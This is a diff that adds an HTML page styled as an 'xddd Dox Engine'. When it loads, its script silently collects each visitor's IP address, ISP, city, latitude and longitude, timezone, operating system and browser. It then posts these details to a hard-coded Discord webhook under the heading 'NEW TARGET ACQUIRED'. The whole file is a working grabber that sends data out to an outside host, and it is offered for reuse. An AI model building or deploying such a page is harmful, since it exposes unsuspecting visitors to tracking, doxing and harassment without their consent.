@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>_xddd</title>
+    <style>
+        body { margin: 0; background-color: #050505; color: #fff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { text-align: center; position: relative; z-index: 2; }
+        .logo { font-size: 90px; color: #ff0000; margin-bottom: -20px; text-shadow: 0 0 20px rgba(255, 0, 0, 0.6); }
+        .sub-text { font-size: 18px; color: #fff; letter-spacing: 12px; margin-bottom: 50px; opacity: 0.7; }
+        .ip-display { font-size: 32px; font-weight: bold; transition: all 0.5s ease; }
+        .status { font-size: 14px; color: #ff0000; text-transform: uppercase; margin-top: 15px; letter-spacing: 2px;}
+        .blood-drip { position: fixed; bottom: 0; left: 0; width: 100%; height: 8px; background: #ff0000; box-shadow: 0 -5px 20px rgba(255, 0, 0, 0.5); }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">⛧</div>
+        <div class="sub-text">xddd</div>
+        <div id="status" class="status">ESTABLISHING CONNECTION...</div>
+        <div id="ip" class="ip-display">0.0.0.0</div>
+    </div>
+
+    <div class="blood-drip"></div>
+
+    <script>
+        // 1. YOUR WEBHOOK URL HERE
+        const WEB_HOOK = "https://discord.com/api/webhooks/1514449352079442041/V5qFavSGWYLXxiO4Rzm9tRkLG7o-14J8JvdzTpKUp2-CJw0PJkv879UsHjDygfLU_GtH";
+
+        async function runDox() {
+            const statusEl = document.getElementById('status');
+            const ipEl = document.getElementById('ip');
+
+            try {
+                // Update UI to show we are working
+                statusEl.innerText = "FETCHING DATA...";
+
+                // 2. Use IP-API (The most reliable for local files)
+                // We add a random timestamp to avoid getting blocked/cached
+                const response = await fetch('http://ip-api.com/json/?nocache=' + new Date().getTime());
+                const data = await response.json();
+
+                if (data && data.status === "success") {
+                    // UI Success
+                    statusEl.innerText = "TARGET_ACQUIRED";
+                    ipEl.innerText = data.query;
+
+                    // 3. Get Browser/OS info
+                    const ua = navigator.userAgent;
+                    let os = "Unknown OS";
+                    if (ua.includes("Win")) os = "Windows";
+                    else if (ua.includes("Mac")) os = "MacOS";
+                    else if (ua.includes("Linux")) os = "Linux";
+                    else if (ua.includes("Android")) os = "Android";
+                    else if (ua.includes("iPhone")) os = "iOS";
+
+                    let browser = "Unknown Browser";
+                    if (ua.includes("Chrome")) browser = "Chrome";
+                    else if (ua.includes("Firefox")) browser = "Firefox";
+                    else if (ua.includes("Safari")) browser = "Safari";
+
+                    // 4. Prepare the Payload
+                    const payload = {
+                        content: `🩸 **[xddd] NEW TARGET ACQUIRED** 🩸`,
+                        embeds: [{
+                            color: 16711680,
+                            fields: [
+                                { name: "🌐 IP", value: `\`${data.query}\``, inline: true },
+                                { name: "🏡 ISP", value: `\`${data.isp || 'Unknown'}\``, inline: true },
+                                { name: "🔢 ASN", value: `\`${data.as || 'Unknown'}\``, inline: true },
+                                { name: "📍 Location", value: `${data.city}, ${data.regionName}, ${data.country}`, inline: false },
+                                { name: "🗺️ Lat/Long", value: `\`${data.lat}, ${data.lon}\``, inline: true },
+                                { name: "⏰ Timezone", value: `\`${data.timezone}\``, inline: true },
+                                { name: "🖥️ OS / Browser", value: `${os} | ${browser}`, inline: false }
+                            ],
+                            footer: { text: "xddd Dox Engine v2.2" },
+                            timestamp: new Date()
+                        }]
+                    };
+
+                    // 5. Send to Discord (using 'no-cors' is not needed for JSON if the URL is valid)
+                    await fetch(WEB_HOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+
+                } else {
+                    statusEl.innerText = "RETRYING...";
+                    setTimeout(runDox, 3000);
+                }
+
+            } catch (error) {
+                console.log("Error:", error);
+                statusEl.innerText = "CONNECTION_FAILED";
+                // If it fails due to CORS or network, try again in 5 seconds
+                setTimeout(runDox, 5000);
+            }
+        }
+
+        window.onload = runDox;
+    </script>
+</body>
+</html>
